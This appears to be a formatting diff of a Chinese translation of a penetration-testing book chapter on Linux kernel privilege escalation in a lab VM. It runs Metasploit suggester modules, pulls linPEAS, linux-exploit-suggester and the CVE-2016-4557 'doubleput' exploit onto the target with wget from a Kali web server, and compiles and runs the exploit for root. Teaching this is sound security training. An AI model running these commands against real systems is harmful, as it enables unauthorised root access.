@@ -70,7 +70,7 @@ Linux 上的内核漏洞利用通常针对 Linux 内核中的漏洞，以执行�
 
     图 10.2 – 虚拟机文件
 
-1.  要将虚拟机导入 VirtualBox，您需要双击 **Stapler.ovf** 文件。您将看到 VirtualBox 导入向导，如下图所示：![图 10.3 – VirtualBox 导入向导    ](img/B17389_10_003.jpg)
+1.  要将虚拟机导入 VirtualBox，您需要双击 `Stapler.ovf` 文件。您将看到 VirtualBox 导入向导，如下图所示：![图 10.3 – VirtualBox 导入向导    ](img/B17389_10_003.jpg)
 
     图 10.3 – VirtualBox 导入向导
 
@@ -92,21 +92,21 @@ Linux 上的内核漏洞利用通常针对 Linux 内核中的漏洞，以执行�
 
 # 使用 Metasploit 进行内核利用
 
-我们可以通过查看如何使用 **Metasploit** 框架进行内核利用来开始内核利用过程。Metasploit 框架提供了自动化和模块化的解决方案，简化了利用过程。
+我们可以通过查看如何使用 `Metasploit` 框架进行内核利用来开始内核利用过程。Metasploit 框架提供了自动化和模块化的解决方案，简化了利用过程。
 
-在本节中，我们的目标系统将是 Ubuntu 16.04 虚拟机。作为前提条件，请确保您已在系统上获得初步的访问权限，并且拥有一个 **meterpreter** 会话：
+在本节中，我们的目标系统将是 Ubuntu 16.04 虚拟机。作为前提条件，请确保您已在系统上获得初步的访问权限，并且拥有一个 `meterpreter` 会话：
 
-1.  第一项任务是扫描目标以寻找潜在的漏洞。为此，我们将使用 **local_exploit_suggester** 模块。此过程在前一章节中已经详细讨论过。
+1.  第一项任务是扫描目标以寻找潜在的漏洞。为此，我们将使用 `local_exploit_suggester` 模块。此过程在前一章节中已经详细讨论过。
 
 1.  我们可以通过运行以下命令在 Metasploit 中加载模块：
 
     **使用 post/multi/recon/local_exploit_suggester**
 
-1.  加载模块后，您需要为该模块设置 **SESSION** 选项。**SESSION** 选项需要您的 meterpreter 会话的会话 ID。可以通过运行以下命令来完成：
+1.  加载模块后，您需要为该模块设置 `SESSION` 选项。`SESSION` 选项需要您的 meterpreter 会话的会话 ID。可以通过运行以下命令来完成：
 
     **设置 SESSION <SESSION-ID>**
 
-    如以下截图所示，**SESSION** 选项应显示您设置的会话 ID：
+    如以下截图所示，`SESSION` 选项应显示您设置的会话 ID：
 
     ![图 10.5 – local_exploit_suggester 选项    ](img/B17389_10_005.jpg)
 
@@ -122,11 +122,11 @@ Linux 上的内核漏洞利用通常针对 Linux 内核中的漏洞，以执行�
 
     图 10.6 – local_exploit_suggester 结果
 
-1.  现在，我们可以开始测试**local_exploit_suggester**推荐的各种漏洞利用模块。输出中的前几个模块通常有更高的成功几率。我们可以通过加载模块来测试列表中的第二个模块，正如前面的截图所示。可以通过运行以下命令来完成此操作：
+1.  现在，我们可以开始测试`local_exploit_suggester`推荐的各种漏洞利用模块。输出中的前几个模块通常有更高的成功几率。我们可以通过加载模块来测试列表中的第二个模块，正如前面的截图所示。可以通过运行以下命令来完成此操作：
 
     **使用 /exploit/linux/local/netfilter_priv_esc_ipv4**
 
-    此内核漏洞利用将利用 Linux 内核版本低于 4.6.3 的**netfilter** bug，并要求启用并加载**iptables**。该漏洞利用还要求安装**libc6-dev-i386**来编译漏洞利用程序。有关此漏洞利用的更多信息，请参阅：[`www.rapid7.com/db/modules/exploit/linux/local/netfilter_priv_esc_ipv4/`](https://www.rapid7.com/db/modules/exploit/linux/local/netfilter_priv_esc_ipv4/)。
+    此内核漏洞利用将利用 Linux 内核版本低于 4.6.3 的`netfilter` bug，并要求启用并加载`iptables`。该漏洞利用还要求安装`libc6-dev-i386`来编译漏洞利用程序。有关此漏洞利用的更多信息，请参阅：[`www.rapid7.com/db/modules/exploit/linux/local/netfilter_priv_esc_ipv4/`](https://www.rapid7.com/db/modules/exploit/linux/local/netfilter_priv_esc_ipv4/)。
 
 1.  加载模块后，您需要设置模块选项，这些选项将包括 meterpreter 会话 ID 和新 meterpreter 会话的有效负载选项，正如以下截图所示：![图 10.7 – 内核漏洞利用模块选项](img/B17389_10_007.jpg)
 
@@ -136,69 +136,69 @@ Linux 上的内核漏洞利用通常针对 Linux 内核中的漏洞，以执行�
 
     **漏洞利用**
 
-    在这种情况下，漏洞利用失败是因为**libc6-dev-i386**未安装，如以下截图所示：
+    在这种情况下，漏洞利用失败是因为`libc6-dev-i386`未安装，如以下截图所示：
 
 ![图 10.8 – Metasploit 内核漏洞利用失败](img/B17389_10_008.jpg)
 
 图 10.8 – Metasploit 内核漏洞利用失败
 
-另外，运行**local_exploit_suggester**建议的其他内核漏洞利用将失败。这是一个重要的教训：您不能总是依赖使用自动化的 Metasploit 模块来获得访问权限或提升目标系统的权限。试错是权限提升过程中一个重要的部分。
+另外，运行`local_exploit_suggester`建议的其他内核漏洞利用将失败。这是一个重要的教训：您不能总是依赖使用自动化的 Metasploit 模块来获得访问权限或提升目标系统的权限。试错是权限提升过程中一个重要的部分。
 
 由于此路径未能产生任何结果，我们需要采用更手动的方式来识别正确的内核漏洞利用方法。让我们从查看如何通过各种枚举脚本列举目标系统的相关信息开始。
 
 # 手动内核漏洞利用
 
-在某些情况下，您可能无法成功使用 Metasploit 模块提升权限，可能无法访问带有 meterpreter 会话的目标，或者您可能通过手动漏洞利用技术（例如 Web Shell）利用了目标。在这种情况下，您将通过标准反向 Shell 进行访问，通常是通过**netcat**来实现的。这带来了一些问题：您如何扫描目标以寻找潜在的内核漏洞？以及如何将内核漏洞传输到目标？
+在某些情况下，您可能无法成功使用 Metasploit 模块提升权限，可能无法访问带有 meterpreter 会话的目标，或者您可能通过手动漏洞利用技术（例如 Web Shell）利用了目标。在这种情况下，您将通过标准反向 Shell 进行访问，通常是通过`netcat`来实现的。这带来了一些问题：您如何扫描目标以寻找潜在的内核漏洞？以及如何将内核漏洞传输到目标？
 
 这些是我们将在本节中解决的问题；我们选择的目标是本章早些时候设置的 Ubuntu 16.04 虚拟机。
 
 ## 本地枚举工具
 
-第一步是扫描并识别潜在的内核漏洞。这可以通过使用 **linux-exploit-suggester** 或其他枚举脚本和工具来完成。在本例中，我们将利用 **linPEAS** 脚本来枚举目标信息。
+第一步是扫描并识别潜在的内核漏洞。这可以通过使用 `linux-exploit-suggester` 或其他枚举脚本和工具来完成。在本例中，我们将利用 `linPEAS` 脚本来枚举目标信息。
 
 注意
 
 linPEAS 是一个本地的 Linux 枚举脚本，用于搜索和扫描潜在的漏洞，然后枚举所有可用于进行权限提升攻击的重要系统信息。
 
-**linPEAS** 二进制文件可以从以下 GitHub 仓库下载：[`github.com/carlospolop/privilege-escalation-awesome-scripts-suite/tree/master/linPEAS`](https://github.com/carlospolop/privilege-escalation-awesome-scripts-suite/tree/master/linPEAS)。
+`linPEAS` 二进制文件可以从以下 GitHub 仓库下载：[`github.com/carlospolop/privilege-escalation-awesome-scripts-suite/tree/master/linPEAS`](https://github.com/carlospolop/privilege-escalation-awesome-scripts-suite/tree/master/linPEAS)。
 
-请确保下载 **linpeas** Bash 脚本，如以下截图所示：
+请确保下载 `linpeas` Bash 脚本，如以下截图所示：
 
 ![图 10.9 – linPEAS Bash 脚本](img/B17389_10_009.jpg)
 
 图 10.9 – linPEAS Bash 脚本
 
-在将 Bash 脚本下载到我们的 Kali 虚拟机后，我们需要将**linpeas.sh**文件传输到目标虚拟机。这无法自动完成，因为我们没有 meterpreter 会话。因此，我们需要利用 Linux 特有的工具来下载二进制文件。
+在将 Bash 脚本下载到我们的 Kali 虚拟机后，我们需要将`linpeas.sh`文件传输到目标虚拟机。这无法自动完成，因为我们没有 meterpreter 会话。因此，我们需要利用 Linux 特有的工具来下载二进制文件。
 
 ## 文件传输
 
-为了将**linpeas.sh**文件传输到我们的目标，我们需要在 Kali 虚拟机上搭建一个 Web 服务器。这个服务器将用来托管文件，以便我们可以在目标系统上下载它。可以通过以下步骤来完成：
+为了将`linpeas.sh`文件传输到我们的目标，我们需要在 Kali 虚拟机上搭建一个 Web 服务器。这个服务器将用来托管文件，以便我们可以在目标系统上下载它。可以通过以下步骤来完成：
 
-1.  为了在 Kali 虚拟机上设置 Web 服务器，我们可以使用 **SimpleHTTPServer** Python 模块来提供二进制文件。可以通过在存储 **linpeas.sh** 二进制文件的目录中运行以下命令来完成：
+1.  为了在 Kali 虚拟机上设置 Web 服务器，我们可以使用 `SimpleHTTPServer` Python 模块来提供二进制文件。可以通过在存储 `linpeas.sh` 二进制文件的目录中运行以下命令来完成：
 
-    **sudo python -m SimpleHTTPServer 80**
+    `sudo python -m SimpleHTTPServer 80`
 
     注意
 
-    如果端口 **80** 已被占用，您还可以使用系统上的任何其他开放端口。
+    如果端口 `80` 已被占用，您还可以使用系统上的任何其他开放端口。
 
-    另外，您还可以通过运行以下命令，利用 Python 3 的 **http.server** 模块：
+    另外，您还可以通过运行以下命令，利用 Python 3 的 `http.server` 模块：
 
-    **sudo python3 -m http.server 80**
+    `sudo python3 -m http.server 80`
 
-    正如以下截图所示，**SimpleHTTPServer** 将在 Kali 虚拟机 IP 地址的 **80** 端口上提供目录中的文件：
+    正如以下截图所示，`SimpleHTTPServer` 将在 Kali 虚拟机 IP 地址的 `80` 端口上提供目录中的文件：
 
     ![图 10.10 – SimpleHTTPServer linpeas.sh    ](img/B17389_10_010.jpg)
 
     图 10.10 – SimpleHTTPServer linpeas.sh
 
-1.  为了将 **linpeas.sh** 文件下载到目标系统，我们可以利用 **wget** 工具。然而，在下载二进制文件之前，我们需要导航到一个我们有读写权限的目录。在这种情况下，我们将导航到临时目录，如以下截图所示：![图 10.11 – Linux 临时目录    ](img/B17389_10_011.jpg)
+1.  为了将 `linpeas.sh` 文件下载到目标系统，我们可以利用 `wget` 工具。然而，在下载二进制文件之前，我们需要导航到一个我们有读写权限的目录。在这种情况下，我们将导航到临时目录，如以下截图所示：![图 10.11 – Linux 临时目录    ](img/B17389_10_011.jpg)
 
     图 10.11 – Linux 临时目录
 
-1.  现在，我们可以使用 **wget** 工具将文件从 Kali 虚拟机下载到目标系统。可以通过在目标系统上运行以下命令来完成：
+1.  现在，我们可以使用 `wget` 工具将文件从 Kali 虚拟机下载到目标系统。可以通过在目标系统上运行以下命令来完成：
 
-    **wget http://<KALI-VM-IP>/linpeas.sh**
+    `wget http://<KALI-VM-IP>/linpeas.sh`
 
     上述命令的输出可以在以下截图中看到：
 
@@ -206,23 +206,23 @@ linPEAS 是一个本地的 Linux 枚举脚本，用于搜索和扫描潜在的�
 
 图 10.12 – wget 成功传输
 
-如前所示的截图，如果传输成功，**linpeas.sh** 文件应该已被下载并以我们指定的名称保存。
+如前所示的截图，如果传输成功，`linpeas.sh` 文件应该已被下载并以我们指定的名称保存。
 
-现在，我们可以使用 **linpeas.sh** 脚本来枚举重要的系统信息，这些信息可以帮助我们提升权限。
+现在，我们可以使用 `linpeas.sh` 脚本来枚举重要的系统信息，这些信息可以帮助我们提升权限。
 
 ## 枚举系统信息
 
-**linpeas.sh** 脚本会列举大量信息，并执行各种检查以发现目标系统上的潜在漏洞。然而，它并不会列出潜在的内核漏洞。在内核漏洞的上下文中，我们可以使用 **linpeas.sh** 脚本来枚举系统信息，例如内核版本。这可以通过以下步骤来完成：
+`linpeas.sh` 脚本会列举大量信息，并执行各种检查以发现目标系统上的潜在漏洞。然而，它并不会列出潜在的内核漏洞。在内核漏洞的上下文中，我们可以使用 `linpeas.sh` 脚本来枚举系统信息，例如内核版本。这可以通过以下步骤来完成：
 
-1.  要列举所有重要的系统信息，我们需要运行 **linpeas.sh** 脚本。然而，在此之前，我们需要确保该脚本具有可执行权限。可以通过在目标系统上运行以下命令来完成：
+1.  要列举所有重要的系统信息，我们需要运行 `linpeas.sh` 脚本。然而，在此之前，我们需要确保该脚本具有可执行权限。可以通过在目标系统上运行以下命令来完成：
 
-    **chmod +x linpeas.sh**
+    `chmod +x linpeas.sh`
 
-1.  现在，我们可以通过在目标系统上运行以下命令来运行 **linpeas.sh** 脚本：
+1.  现在，我们可以通过在目标系统上运行以下命令来运行 `linpeas.sh` 脚本：
 
-    **./linpeas.sh -o SysI**
+    `./linpeas.sh -o SysI`
 
-    **SysI** 选项用于将脚本的结果限制为仅系统信息。这主要是因为 **linpeas.sh** 脚本会生成大量输出。
+    `SysI` 选项用于将脚本的结果限制为仅系统信息。这主要是因为 `linpeas.sh` 脚本会生成大量输出。
 
     如下截图所示，脚本会列举系统信息，包括已安装的内核版本、Linux 发行版版本以及代号：
 
@@ -232,15 +232,15 @@ linPEAS 是一个本地的 Linux 枚举脚本，用于搜索和扫描潜在的�
 
 在这种情况下，我们的目标系统运行的是 Ubuntu 16.04 LTS，内核版本为 4.4.0-21。我们可以利用这些信息来识别影响此版本内核的特定漏洞。发行版 ID、版本号和代号也非常重要，因为某些内核漏洞是专门为特定的 Linux 发行版设计的。
 
-**linPEAS** 脚本没有提供任何潜在的内核漏洞，可以用于提升我们的权限。因此，我们必须使用其他枚举脚本。
+`linPEAS` 脚本没有提供任何潜在的内核漏洞，可以用于提升我们的权限。因此，我们必须使用其他枚举脚本。
 
 注意
 
-**linPEAS** 脚本列举了许多有用的信息，这些信息将在本书的后续章节中非常有用，尤其是在我们深入探讨其他 Linux 提权技巧时。
+`linPEAS` 脚本列举了许多有用的信息，这些信息将在本书的后续章节中非常有用，尤其是在我们深入探讨其他 Linux 提权技巧时。
 
 ## 枚举内核漏洞
 
-我们可以使用**linux-exploit-suggester**来枚举我们的系统信息并扫描潜在的内核漏洞。**linux-exploit-suggester**脚本可以从[`github.com/mzet-/linux-exploit-suggester`](https://github.com/mzet-/linux-exploit-suggester)下载。
+我们可以使用`linux-exploit-suggester`来枚举我们的系统信息并扫描潜在的内核漏洞。`linux-exploit-suggester`脚本可以从[`github.com/mzet-/linux-exploit-suggester`](https://github.com/mzet-/linux-exploit-suggester)下载。
 
 建议下载脚本并将其重命名为更简单的文件名。可以通过运行以下命令来实现自动化：
 
@@ -248,17 +248,17 @@ wget https://raw.githubusercontent.com/mzet-/linux-exploit-suggester/master/linu
 
 下载脚本后，我们需要将其传输到目标系统。可以按照以下步骤进行操作：
 
-1.  为了在 Kali 虚拟机上搭建一个 Web 服务器，我们可以利用**SimpleHTTPServer** Python 模块来提供二进制文件。可以通过在存储**les.sh**脚本的目录中运行以下命令来完成此操作：
+1.  为了在 Kali 虚拟机上搭建一个 Web 服务器，我们可以利用`SimpleHTTPServer` Python 模块来提供二进制文件。可以通过在存储`les.sh`脚本的目录中运行以下命令来完成此操作：
 
-    **sudo python -m SimpleHTTPServer 80**
+    `sudo python -m SimpleHTTPServer 80`
 
-1.  要在目标系统上下载**les.sh**脚本，我们可以使用**wget**工具。然而，在下载二进制文件之前，我们需要导航到一个具有读写权限的目录。在这种情况下，我们将导航到临时目录，如以下截图所示：![图 10.14 – Linux 临时目录    ](img/B17389_10_014.jpg)
+1.  要在目标系统上下载`les.sh`脚本，我们可以使用`wget`工具。然而，在下载二进制文件之前，我们需要导航到一个具有读写权限的目录。在这种情况下，我们将导航到临时目录，如以下截图所示：![图 10.14 – Linux 临时目录    ](img/B17389_10_014.jpg)
 
     图 10.14 – Linux 临时目录
 
-    现在我们可以使用**wget**工具将文件从 Kali 虚拟机下载到目标系统。可以通过在目标系统上运行以下命令来完成此操作：
+    现在我们可以使用`wget`工具将文件从 Kali 虚拟机下载到目标系统。可以通过在目标系统上运行以下命令来完成此操作：
 
-    **wget http://<KALI-VM-IP>/les.sh**
+    `wget http://<KALI-VM-IP>/les.sh`
 
     输出显示在以下截图中：
 
@@ -266,11 +266,11 @@ wget https://raw.githubusercontent.com/mzet-/linux-exploit-suggester/master/linu
 
     图 10.15 – wget 成功传输
 
-    如上所示，如果传输成功，**les.sh**脚本应已下载并以我们指定的名称保存。
+    如上所示，如果传输成功，`les.sh`脚本应已下载并以我们指定的名称保存。
 
-1.  现在我们可以使用**les.sh**脚本来枚举我们可以利用来提升权限的潜在内核漏洞。可以通过在目标系统上运行以下命令来完成此操作：
+1.  现在我们可以使用`les.sh`脚本来枚举我们可以利用来提升权限的潜在内核漏洞。可以通过在目标系统上运行以下命令来完成此操作：
 
-    **./les.sh**
+    `./les.sh`
 
     如下图所示，脚本将枚举所有可用于提升权限的潜在内核漏洞。我们现在可以利用这些信息来确定使用哪个内核漏洞：
 
@@ -282,15 +282,15 @@ wget https://raw.githubusercontent.com/mzet-/linux-exploit-suggester/master/linu
 
     图 10.17 – CVE-2016-4557 Google 搜索
 
-    先前的 Google 搜索揭示了一个 **exploit-db** 的引用，其中包含有关该漏洞的信息、漏洞的源代码以及如何使用它。
+    先前的 Google 搜索揭示了一个 `exploit-db` 的引用，其中包含有关该漏洞的信息、漏洞的源代码以及如何使用它。
 
     始终建议分析源代码，以确保它不是恶意的，并且按预期工作。这使你能够进行任何必要的修改。
 
-1.  或者，我们也可以使用 **exploit-db** 命令行工具来查询特定的漏洞。可以通过在 Kali 虚拟机上运行以下命令来完成：
+1.  或者，我们也可以使用 `exploit-db` 命令行工具来查询特定的漏洞。可以通过在 Kali 虚拟机上运行以下命令来完成：
 
-    **searchsploit linux kernel 4.4**
+    `searchsploit linux kernel 4.4`
 
-    在这种情况下，我们正在查询 **exploit-db** 数据库，寻找与 Linux 内核版本 4.4.0 相关的漏洞。如以下截图所示，我们可以识别相同的漏洞：
+    在这种情况下，我们正在查询 `exploit-db` 数据库，寻找与 Linux 内核版本 4.4.0 相关的漏洞。如以下截图所示，我们可以识别相同的漏洞：
 
 ![图 10.18 – Searchsploit 结果](img/B17389_10_018.jpg)
 
@@ -310,7 +310,7 @@ wget https://raw.githubusercontent.com/mzet-/linux-exploit-suggester/master/linu
 
 图 10.19 – 漏洞利用说明
 
-在这个特定的案例中，我们需要将包含编译脚本和漏洞二进制文件的 ZIP 文件下载到目标系统。完成此操作后，我们需要运行 **doubleput** 二进制文件来提升我们的会话。
+在这个特定的案例中，我们需要将包含编译脚本和漏洞二进制文件的 ZIP 文件下载到目标系统。完成此操作后，我们需要运行 `doubleput` 二进制文件来提升我们的会话。
 
 关于此漏洞的更多信息可以在这里找到：[`www.exploit-db.com/exploits/39772`](https://www.exploit-db.com/exploits/39772)。
 
@@ -318,33 +318,33 @@ wget https://raw.githubusercontent.com/mzet-/linux-exploit-suggester/master/linu
 
 1.  该过程的第一步是将漏洞文件下载到你的 Kali 虚拟机。可以通过运行以下命令来完成：
 
-    **wget https://github.com/offensive-security/exploit-database-bin-sploits/raw/master/bin-sploits/39772.zip**
+    `wget https://github.com/offensive-security/exploit-database-bin-sploits/raw/master/bin-sploits/39772.zip`
 
-1.  下载漏洞文件后，我们需要将其传输到目标系统。这可以通过在 Kali 虚拟机上启动本地 Web 服务器，并使用 **SimpleHTTPServer** Python 模块来完成：
+1.  下载漏洞文件后，我们需要将其传输到目标系统。这可以通过在 Kali 虚拟机上启动本地 Web 服务器，并使用 `SimpleHTTPServer` Python 模块来完成：
 
-    **sudo python -m SimpleHTTPServer 80**
+    `sudo python -m SimpleHTTPServer 80`
 
-1.  要将二进制文件下载到目标系统，我们可以使用 **wget** 工具。然而，在下载二进制文件之前，我们需要导航到一个有读写权限的目录。在这种情况下，我们将导航到临时目录，正如我们在前面章节中所做的那样。
+1.  要将二进制文件下载到目标系统，我们可以使用 `wget` 工具。然而，在下载二进制文件之前，我们需要导航到一个有读写权限的目录。在这种情况下，我们将导航到临时目录，正如我们在前面章节中所做的那样。
 
-1.  现在，我们可以使用 **wget** 工具将漏洞文件从 Kali 虚拟机下载到目标系统。这可以通过在目标系统上运行以下命令来完成：
+1.  现在，我们可以使用 `wget` 工具将漏洞文件从 Kali 虚拟机下载到目标系统。这可以通过在目标系统上运行以下命令来完成：
 
-    **wget http://<KALI-VM-IP>/39772.zip**
+    `wget http://<KALI-VM-IP>/39772.zip`
 
 1.  将漏洞文件传输到目标系统后，我们需要解压该文件。可以通过运行以下命令来完成：
 
-    **unzip 39772.zip**
+    `unzip 39772.zip`
 
-    解压漏洞文件后，你将看到一个名为 **39772** 的目录。进入该目录后，可以看到以下文件：
+    解压漏洞文件后，你将看到一个名为 `39772` 的目录。进入该目录后，可以看到以下文件：
 
     ![图 10.20 – 漏洞利用压缩包内容    ](img/B17389_10_020.jpg)
 
     图 10.20 – 漏洞利用压缩包内容
 
-1.  现在，我们需要提取 **exploit.tar** 压缩包。可以通过运行以下命令来完成：
+1.  现在，我们需要提取 `exploit.tar` 压缩包。可以通过运行以下命令来完成：
 
-    **tar xf exploit.tar**
+    `tar xf exploit.tar`
 
-    在提取 **exploit.tar** 压缩包后，你将看到一个目录，如下图所示：
+    在提取 `exploit.tar` 压缩包后，你将看到一个目录，如下图所示：
 
     ![图 10.21 – 漏洞利用目录    ](img/B17389_10_021.jpg)
 
@@ -354,17 +354,17 @@ wget https://raw.githubusercontent.com/mzet-/linux-exploit-suggester/master/linu
 
 1.  我们可以通过运行以下命令来执行漏洞利用编译脚本：
 
-    **./compile.sh**
+    `./compile.sh`
 
-    漏洞利用脚本将生成一个名为 **doubleput** 的漏洞利用二进制文件，如下图所示：
+    漏洞利用脚本将生成一个名为 `doubleput` 的漏洞利用二进制文件，如下图所示：
 
     ![图 10.22 – 漏洞利用二进制文件    ](img/B17389_10_022.jpg)
 
     图 10.22 – 漏洞利用二进制文件
 
-1.  根据漏洞执行指令，我们可以运行**doubleput**二进制文件来获取提升会话。可以通过运行以下命令来实现：
+1.  根据漏洞执行指令，我们可以运行`doubleput`二进制文件来获取提升会话。可以通过运行以下命令来实现：
 
-    **./doubleput**
+    `./doubleput`
 
     如果漏洞利用二进制文件成功运行，你应该会收到一个带有 root 权限的提升会话，以下截图中已突出显示：
 
